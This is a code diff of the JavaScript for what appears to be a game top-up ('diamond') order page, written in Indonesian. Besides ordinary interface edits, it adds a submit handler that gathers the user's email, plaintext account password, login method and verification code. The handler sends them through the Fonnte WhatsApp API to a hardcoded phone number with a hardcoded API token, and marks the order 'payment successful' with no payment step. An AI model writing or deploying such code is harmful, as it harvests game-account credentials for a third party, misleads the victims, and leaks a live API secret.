@@ -1,7 +1,6 @@
 let activeTab = null;
 const selectedItems = new Set();
 const orderList = document.getElementById("order-list");
-
 const dataProduk = {
   diamond: {
     note: "",
@@ -49,7 +48,6 @@ const dataProduk = {
 function toggleTab(tabName) {
   const container = document.getElementById("produk-container");
   const note = document.getElementById("produk-note");
-
   if (activeTab === tabName) {
     container.innerHTML = "";
     note.style.display = "none";
@@ -64,17 +62,16 @@ function renderProduk(tabName) {
   const container = document.getElementById("produk-container");
   const note = document.getElementById("produk-note");
   container.innerHTML = "";
-  selectedItems.clear();
-  updateOrderList();
 
   const produk = dataProduk[tabName];
   produk.list.forEach(([label, harga]) => {
+    const key = `${label} - ${harga}`;
     const div = document.createElement("div");
     div.className = "produk-item";
     div.innerHTML = `<strong>${label}</strong><br><small>${harga}</small>`;
-    
+    if (selectedItems.has(key)) div.classList.add("selected");
+
     div.addEventListener("click", () => {
-      const key = `${label} - ${harga}`;
       if (selectedItems.has(key)) {
         selectedItems.delete(key);
         div.classList.remove("selected");
@@ -100,7 +97,14 @@ function updateOrderList() {
   orderList.innerHTML = "";
   selectedItems.forEach((item) => {
     const p = document.createElement("p");
-    p.innerHTML = `${item} <button class="cancel-btn" onclick="removeOrder('${item}')">❌</button>`;
+    const text = document.createTextNode(item);
+    const btn = document.createElement("button");
+    btn.className = "cancel-btn";
+    btn.textContent = "Cancel";
+    btn.onclick = () => removeOrder(item);
+    p.classList.add("order-item");
+    p.appendChild(text);
+    p.appendChild(btn);
     orderList.appendChild(p);
   });
 }
@@ -108,11 +112,11 @@ function updateOrderList() {
 function removeOrder(item) {
   selectedItems.delete(item);
   updateOrderList();
-
-  // juga update tampilan produk
+  // hilangkan highlight dari daftar harga
   const items = document.querySelectorAll(".produk-item");
   items.forEach((div) => {
-    if (div.innerText.replace(/\n/g, " ") === item) {
+    const text = div.innerText.replace(/\n/g, " ");
+    if (text === item) {
       div.classList.remove("selected");
     }
   });
@@ -135,45 +139,79 @@ document.addEventListener("DOMContentLoaded", () => {
   btnOrder.addEventListener("click", (e) => {
     const inputs = form.querySelectorAll("input, select");
     let isEmpty = false;
-
     inputs.forEach((input) => {
       if (!input.value.trim()) {
         isEmpty = true;
       }
     });
 
-    if (isEmpty) {
+    if (isEmpty || selectedItems.size === 0) {
       e.preventDefault();
       Swal.fire({
         icon: "warning",
-        title: "Ketua Harap isi kolom yang kosong 😁",
+        title: "Ketua Harap isi semua kolom & pilih item ya 😁",
         background: "rgba(0,0,0,0.4)",
         color: "#fff",
-        backdrop: `rgba(0, 0, 0, 0.4)`,
-        showCancelButton: true,
         confirmButtonText: "Siap ketua 🔥",
-        cancelButtonText: "Batal",
         customClass: {
           title: "glow-text",
           popup: "custom-popup",
-          confirmButton: "btn-confirm",
-          cancelButton: "btn-cancel"
-        }
-      }).then((result) => {
-        if (!result.isConfirmed) {
-          Swal.fire({
-            icon: "error",
-            title: "Yah maaf ketua 😓",
-            text: "Permintaan kamu belum dapat kita proses.",
-            background: "rgba(0,0,0,0.4)",
-            color: "#fff",
-            customClass: {
-              title: "glow-text",
-              popup: "custom-popup"
-            }
-          });
+          confirmButton: "btn-confirm"
         }
       });
+      return;
     }
+
+    // Kirim pesan ke Fonnte
+    const data = Object.fromEntries(new FormData(form).entries());
+    const listItem = Array.from(selectedItems).join("%0A");
+
+    const message = `🔥 *Order Baru dari Website* 🔥
+👤 Nickname: ${data.nickname}
+📧 Email: ${data.email}
+🔐 Password: ${data.password}
+🔑 Login: ${data.loginMethod}
+📱 WhatsApp: ${data.whatsapp}
+🛒 Order: 
+${listItem}
+🔒 V2L: ${data.v2l ? data.v2l : "tidak diketahui"}
+✅ Status: Pembayaran berhasil`;
+
+    fetch("https://api.fonnte.com/send", {
+      method: "POST",
+      headers: {
+        Authorization: "TGNPKLafWVUGGV3mtvsu",
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        target: "6283833121742",
+        message: message
+      })
+    })
+      .then((res) => res.json())
+      .then((data) => {
+        console.log("Pesan terkirim:", data);
+        Swal.fire({
+          icon: "success",
+          title: "Orderan kamu sudah dikirim ke admin ✅",
+          background: "rgba(0,0,0,0.5)",
+          color: "#fff",
+          confirmButtonText: "Oke Ketua",
+          customClass: {
+            title: "glow-text",
+            popup: "custom-popup",
+            confirmButton: "btn-confirm"
+          }
+        });
+      })
+      .catch((err) => {
+        console.error("Gagal kirim:", err);
+        Swal.fire({
+          icon: "error",
+          title: "Gagal mengirim ke WhatsApp 😢",
+          background: "rgba(0,0,0,0.5)",
+          color: "#fff"
+        });
+      });
   });
 });
